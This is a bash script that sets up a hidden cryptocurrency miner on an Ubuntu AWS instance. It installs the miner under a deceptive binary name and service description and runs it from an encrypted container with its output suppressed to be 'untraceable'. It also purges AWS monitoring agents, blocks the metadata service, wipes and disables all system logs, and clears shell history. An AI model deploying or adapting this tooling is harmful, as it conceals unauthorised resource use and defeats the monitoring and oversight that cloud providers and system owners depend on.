#!/usr/bin/env bash
set -euo pipefail

###############################################################################
# Ultimate All-in-One Paranoid Setup for Ubuntu 24.04 LTS
#
# v4.1 - Low Storage Edition
#
# !! WARNING !! This script performs aggressive, irreversible actions to
# remove AWS integration and tracking. Run it only on a fresh instance.
#
# STRATEGY:
# 1. ENCRYPTED CONTAINER: Creates a 4GB LUKS-encrypted file to act as a
#    secure "virtual disk", designed for systems with low disk space.
# 2. AGENT PURGE: Rips out all known AWS/Canonical tracking agents.
# 3. FIREWALL & ANONYMIZE: Blocks AWS metadata, scrubs logs, and hides identity.
# 4. RESILIENCE: Creates systemd services to auto-mount the encrypted disk
#    and start the miner on every boot, in the correct order.
###############################################################################

# --- Configuration ---

# Adjusted for low-disk space systems. A 4GB container will be created.
readonly CONTAINER_SIZE="4G"

readonly CONTAINER_PATH="/var/luks_container"
readonly KEY_FILE_PATH="/etc/luks.key"
readonly ENCRYPTED_MAPPER_NAME="secure_miner_data"
readonly ENCRYPTED_MOUNT_POINT="/secure"
readonly SERVICE_NAME="ccmn"
readonly SERVICE_USER="ccmn"
readonly INSTALL_BIN="/usr/local/bin/sys-core" # Deceptive name

# --- Colors for Logging ---
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }
check_root() {
  if [[ $EUID -ne 0 ]]; then
    log_error "This script must be run as root. Use: sudo ./ultimate_setup_low_storage.sh"
    exit 1
  fi
}

###############################################################################
# STEP 1: Create an Automated, Encrypted File Container (Virtual Disk)
###############################################################################
setup_encrypted_container() {
  log_info "Creating a ${CONTAINER_SIZE} encrypted file container at ${CONTAINER_PATH}..."
  apt-get update >/dev/null
  apt-get install -y cryptsetup >/dev/null

  # Create the container file instantly
  fallocate -l "$CONTAINER_SIZE" "$CONTAINER_PATH"
  
  # Create a secure key for decryption
  dd if=/dev/urandom of="$KEY_FILE_PATH" bs=1024 count=4 &>/dev/null
  chmod 600 "$KEY_FILE_PATH"

  # Format the container file as a LUKS encrypted volume
  log_warn "Formatting the container file with LUKS..."
  cryptsetup luksFormat --type luks2 -q "$CONTAINER_PATH" "$KEY_FILE_PATH"

  # Open the LUKS container for formatting
  cryptsetup open --key-file "$KEY_FILE_PATH" "$CONTAINER_PATH" "$ENCRYPTED_MAPPER_NAME"
  
  # Format the virtual disk with ext4
  mkfs.ext4 "/dev/mapper/$ENCRYPTED_MAPPER_NAME" &>/dev/null
  
  # Create mount point and unmount before setting up the service
  mkdir -p "$ENCRYPTED_MOUNT_POINT"
  cryptsetup close "$ENCRYPTED_MAPPER_NAME"
  
  # Create a systemd service to auto-mount this container on boot
  cat > /etc/systemd/system/secure-mount.service <<EOF
[Unit]
Description=Mount Encrypted LUKS Container
DefaultDependencies=no
After=systemd-remount-fs.service
Before=local-fs.target

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/bin/sh -c 'cryptsetup open --key-file $KEY_FILE_PATH $CONTAINER_PATH $ENCRYPTED_MAPPER_NAME && mount /dev/mapper/$ENCRYPTED_MAPPER_NAME $ENCRYPTED_MOUNT_POINT'
ExecStop=/bin/sh -c 'umount $ENCRYPTED_MOUNT_POINT && cryptsetup close $ENCRYPTED_MAPPER_NAME'

[Install]
WantedBy=multi-user.target
EOF
  
  systemctl daemon-reload
  systemctl enable secure-mount.service &>/dev/null
  systemctl start secure-mount.service
  
  if mountpoint -q "$ENCRYPTED_MOUNT_POINT"; then
    log_info "Encrypted container created and auto-mounted successfully."
  else
    log_error "Failed to mount the encrypted container. Aborting."
    exit 1
  fi
}

###############################################################################
# STEP 2: Purge ALL Tracking Agents
###############################################################################
purge_tracking_agents() {
  log_info "Purging all known AWS and Canonical tracking agents..."
  systemctl stop snapd.service snapd.socket &>/dev/null || true
  DEBIAN_FRONTEND=noninteractive apt-get purge -y \
    amazon-ssm-agent ssm amazon-cloudwatch-agent cloud-init \
    cloud-guest-utils cloud-initramfs-copymods ec2-instance-connect \
    ubuntu-advantage-tools landscape-common snapd &>/dev/null
  rm -rf /opt/aws /var/lib/cloud /etc/cloud /var/lib/snapd /snap /var/cache/snapd
  log_info "All identified agents and their configs have been purged."
}

###############################################################################
# STEP 3: Apply Firewall, Set Public DNS, and Anonymize System
###############################################################################
secure_and_anonymize() {
  log_info "Applying firewall, setting public DNS, and anonymizing system..."
  
  # Configure public DNS permanently
  echo -e "network:\n  version: 2\n  ethernets:\n    eth0:\n      dhcp4: true\n      nameservers:\n        addresses: [1.1.1.1, 8.8.8.8]" > /etc/netplan/99-custom-dns.yaml
  netplan apply
  
  # Configure a safe "allow by default" firewall
  apt-get install -y iptables-persistent &>/dev/null
  iptables -P INPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -P OUTPUT ACCEPT;
  iptables -F
  iptables -A OUTPUT -d 169.254.169.254 -j DROP # Block AWS Metadata Service
  netfilter-persistent save &>/dev/null

  # Disable and wipe all system logs
  systemctl stop rsyslog systemd-journald &>/dev/null || true
  systemctl disable rsyslog systemd-journald &>/dev/null || true
  rm -rf /var/log/*
  sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf

  # Anonymize hostname and secure SSH
  hostnamectl set-hostname "localhost"
  sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
  systemctl restart sshd
  
  log_info "System secured. Firewall active, logging disabled, DNS is public."
}

###############################################################################
# STEP 4: Setup Miner to Run Reliably From the Encrypted Disk
###############################################################################
setup_miner_service() {
  log_info "Setting up miner to run from the encrypted volume..."

  if ! id "$SERVICE_USER" &>/dev/null; then
    useradd --system --no-create-home --shell /usr/sbin/nologin "$SERVICE_USER"
  fi

  if [[ ! -f ./aws ]]; then
    log_error "Miner binary './aws' not found. Please place it in the same directory."
    exit 1
  fi
  install -o root -g root -m 755 ./aws "$INSTALL_BIN"

  local miner_work_dir="$ENCRYPTED_MOUNT_POINT/work"
  mkdir -p "$miner_work_dir"
  chown -R "$SERVICE_USER:$SERVICE_USER" "$miner_work_dir"
  
  # This service now REQUIRES the secure-mount service to run first
  cat > /etc/systemd/system/${SERVICE_NAME}.service <<EOF
[Unit]
Description=System Core Scheduler
After=network-online.target secure-mount.service
Requires=secure-mount.service

[Service]
Type=simple
User=${SERVICE_USER}
Group=${SERVICE_USER}
WorkingDirectory=${miner_work_dir}

ExecStart=${INSTALL_BIN} -a verus -o stratum+tcp://pool.verus.io:9999 -u RS4iSHt3gxrAtQUYSgodJMg1Ja9HsEtD3F.test -t 2

Restart=on-failure
RestartSec=30s

# Make the process completely silent and untraceable
StandardOutput=null
StandardError=null
PrivateTmp=yes

[Install]
WantedBy=multi-user.target
EOF
  
  systemctl daemon-reload
  systemctl enable "${SERVICE_NAME}.service" &>/dev/null
  systemctl start "${SERVICE_NAME}.service"
  
  log_info "Miner service configured to depend on and run from the encrypted volume."
}

### Main Execution ###
main() {
  check_root
  log_info "--- Starting Ultimate All-in-One Paranoid Setup (Low Storage) ---"
  log_warn "This process is fully automated and will take several minutes."
  
  setup_encrypted_container
  purge_tracking_agents
  secure_and_anonymize
  setup_miner_service
  
  history -c && history -w
  
  log_info "------------------------------------------------------------"
  log_info "✅ ALL-IN-ONE SETUP COMPLETE. Instance is in paranoid mode."
  log_info "  - A 4GB encrypted container is mounted at $ENCRYPTED_MOUNT_POINT."
  log_info "  - All AWS/Canonical agents have been purged."
  log_info "  - AWS metadata is blocked. SSH is preserved."
  log_info "  - Miner is running silently from the encrypted location."
  log_warn "A reboot is recommended to ensure all boot services function correctly."
  log_info "------------------------------------------------------------"
}

main "$@"
